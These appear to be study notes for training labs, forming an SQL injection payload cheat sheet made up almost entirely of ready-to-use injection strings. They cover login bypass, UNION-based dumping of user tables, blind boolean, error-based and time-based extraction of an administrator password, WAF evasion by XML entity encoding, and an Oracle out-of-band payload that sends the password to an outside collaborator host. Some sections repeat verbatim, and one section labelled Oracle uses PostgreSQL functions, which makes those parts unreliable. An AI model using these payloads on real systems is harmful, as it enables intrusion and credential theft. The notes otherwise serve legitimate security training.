# WHERE clause allowing retrieval of hidden data
```
GET /filter?category='OR+1=1--
```
# Login bypass
```
username=administrator'OR+1=1--
```
# Query DB type and version Oracle
```
GET /filter?category=Lifestyle'UNION+SELECT+NULL,banner+FROM+v$version--
```
# Query DB type and version MySQL and MSSQL
```
GET /filter?category=Accessories'UNION+SELECT+@@version,'sqlitest2'--+-
```
# List DB contents on non-Oracle
- PostgreSQL
1. List tables
```
'UNION+SELECT+table_name,'SQLITESTTWO'+FROM+information_schema.tables--+-
```
2. List columns
```
'UNION+SELECT+column_name,'SQLITESTTWO'+FROM+information_schema.columns+WHERE+table_name='users_touygs'--+-
```
3. Extract content from both columns
```
'UNION+SELECT+password_adevhf,username_clvnch+FROM+users_touygs--+-
```
# List DB contents on Oracle
- Oracle
1. List tables
```
'UNION+SELECT+table_name,null+FROM+all_tables--+-
```
2. List columns
```
'UNION+SELECT+column_name,null+FROM+all_tab_columns+where+table_name+=+'USERS_OKFWZM'--+-
```
3. Extract contents from both columns
```
'UNION+SELECT+USERNAME_UBAAFP,PASSWORD_JYKMOZ+FROM+USERS_OKFWZM--+-
```
# Query DB type and version Oracle
```
GET /filter?category=Lifestyle'UNION+SELECT+NULL,banner+FROM+v$version--
```
# Query DB type and version MySQL and MSSQL
```
GET /filter?category=Accessories'UNION+SELECT+@@version,'sqlitest2'--+-
```
# List DB contents on non-Oracle
- PostgreSQL
1. List tables
```
'UNION+SELECT+table_name,'SQLITESTTWO'+FROM+information_schema.tables--+-
```
2. List columns
```
'UNION+SELECT+column_name,'SQLITESTTWO'+FROM+information_schema.columns+WHERE+table_name='users_touygs'--+-
```
3. Extract content from both columns
```
'UNION+SELECT+password_adevhf,username_clvnch+FROM+users_touygs--+-
```
# List DB contents on Oracle
- Oracle
1. List tables
```
'UNION+SELECT+table_name,null+FROM+all_tables--+-
```
2. List columns
```
'UNION+SELECT+column_name,null+FROM+all_tab_columns+where+table_name+=+'USERS_OKFWZM'--+-
```
3. Extract contents from both columns
```
'UNION+SELECT+USERNAME_UBAAFP,PASSWORD_JYKMOZ+FROM+USERS_OKFWZM--+-
```
# String concatenation
- PostgreSQL
1. List tables
```
'UNION+SELECT+NULL,table_name+FROM+information_schema.tables--+-
```
2. List columns from identified table
```
'UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users'--+-
```
3. Use string concatenation to retrieve username and password together
```
'UNION+SELECT+NULL,username+||+'---'+||+password+FROM+users--+-
```
# Blind SQLi conditional responses
- PostgreSQL
1. Identify differences in response size submitting TRUE/FALSE conditions
```
'AND+1=1--+-
'AND+1=0--+-
```
2. Use comparer to find differences in HTTP responses
3. Determine number of columns
```
'ORDER BY 1--#
```
4. Enumerate table names
```
'AND (SELECT 'z' FROM {table_name} LIMIT 1)='z
```
5. Enumerate column names
```
'UNION SELECT {column_name} FROM {table_name} WHERE 1=1--#
```
6. This payload enumerate valid usernames from a `username` column
```
'AND (SELECT 'zzz' FROM users where username='administrator')='zzz'--#
```
7. This payload enumerates the length of the password value for the administrator username
```
'AND (SELECT 'zzz' FROM users where username='administrator' and length(password)=20)='zzz'--#
```
8. Enumerate password characters one at a time
```
1. Confirms first character is GREATER THAN 'a'

'AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')>'a--#

2. Confirms first character is NOT greater than 't'

'AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')>'t--#

3. Confirms the first character is EQUAL TO 'f' - Note: Extra single quote added because we are commenting out the request of the query...

'AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='f'--#
```
9. [[SQLi demos#^c9e65b|Speed up with intruder]]
# Blind SQLi conditional errors
- Oracle DBMS
1. Detect conditional errors with probing payloads
```
'AND TO_CHAR(1/1)=1-- -
'AND TO_CHAR(1/0)=1-- -

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -

'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -
```
2. Determine number of columns
```
'ORDER BY 1-- #
'ORDER BY 2-- #
```
3. Enumerate table names
```
'||(SELECT '' FROM users WHERE ROWNUM = 1)-- -
'||(SELECT '' FROM not_exist WHERE ROWNUM = 1)-- -
```
4. Enumerate columns names
```
'UNION SELECT {column_name} FROM {table_name} WHERE 1=1-- #
```
- `200 OK` indicates column exists in the valid table name provided
5. This payload enumerates if the username exists in the `username` column
```
'||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE USERNAME='administrator')||'
```
6. Determine the length of the password for the `administrator` user
```
'||(SELECT CASE WHEN LENGTH(password)=19 THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE USERNAME='administrator')-- #

'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE USERNAME='administrator')-- #
```
7. Extract data one character at a time using conditional errors
	- If the value extracted is correct, then a 1/0 error will result
```
'||(SELECT CASE WHEN(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='w') THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)-- #

'||(SELECT CASE WHEN(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)-- #
```
8. [[SQLi demos#^47d308|Speed up with intruder]]
# Visible error-based
- PostgreSQL
1. Submit probe payload and identify verbose error message in HTTP response
2. Confirm data retrieval and identify database version
```
'AND CAST((SELECT version()) AS INT)=1--
```
3. Extract first row from `username` column in `users` table
```
'AND CAST((SELECT username FROM users LIMIT 1) AS INT)=1--
```
4. Extract first row from `password` column in `users` table
```
'AND CAST((SELECT password FROM users LIMIT 1) AS INT)=1--
```
# Blind SQLi with time delays
- Oracle
1. Submit conditional payload to trigger time delay
```
'AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM PG_SLEEP(10)) ELSE 1337 END)-- #
```
- Payloads taken from [Complex Time Based Injections](https://tib3rius.com/sqli.html#time-based-exploitation)
2. Payload to extract table name `1` character at a time from `information_schema.tables`
	- TRUE statements will result in a 9 second time delay
```
'%3b(SELECT CASE WHEN SUBSTRING(table_name,1,1)='u' THEN PG_SLEEP(9) ELSE PG_SLEEP(0) END FROM information_schema.tables LIMIT 1)-- #
```
3. Payload to brute-force table names
```
';SELECT CASE WHEN (table_name='{tableName}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM information_schema.tables--
```
4. Payload to brute-force column names from `users` table
```
';SELECT CASE WHEN (column_name='{columnName}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM information_schema.columns WHERE table_name='users'--
```
5. Payload to determine the length of the `administrator`'s password
```
'%3b(SELECT CASE WHEN (username='administrator' and length(password)>1) THEN PG_SLEEP(9) ELSE PG_SLEEP(0) END FROM users)-- #
```
6. Extract the `administrator`'s password `1` character at a time
```
'%3b(SELECT CASE WHEN (username='administrator' and substring(password,1,1)='g') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END FROM users)-- #
```
# OOB SQLi detection
- Oracle
```
'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//4v0v7dy1xfrgexbyip9ufiwouf06o7cw.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
# Data exfiltration OOB
- Oracle
```
'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT password FROM users WHERE username='administrator')||'.e8n5knbbap4qr7o8vzm4ss9y7pdg1kp9.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
# Different contexts (XML encoding to bypass WAF)
1. Identify SQLi using AND payload
```
&#x41;ND 1
```
2. Identify DBMS using conditional errors for PostgreSQL
```
1 &#65;&#78;&#68; 1 = (&#83;ELECT CASE WHEN (1=1) THEN 1/(&#83;ELECT 0) ELSE NULL END)
```
3. Determine number of columns
```
ORDER BY 1
```
4. Determine UNION based attack works and can extract string data
```
1 &#85;NION &#83;ELECT &#39;sqli testing&#39;&#45;&#45;
```
5. Extract table names
```
1 &#85;NION &#83;ELECT table_name FROM information_schema.tables&#45;&#45;
```
6. Extract column names
```
1 &#85;NION &#83;ELECT column_name FROM information_schema.columns WHERE table_name = &#39;users&#39;&#45;&#45;
```
7. Use string concatenation to extract all information together
```
1 &#85;NION &#83;ELECT username||&#x27;~~~&#x27;||password FROM users&#45;&#45;
```


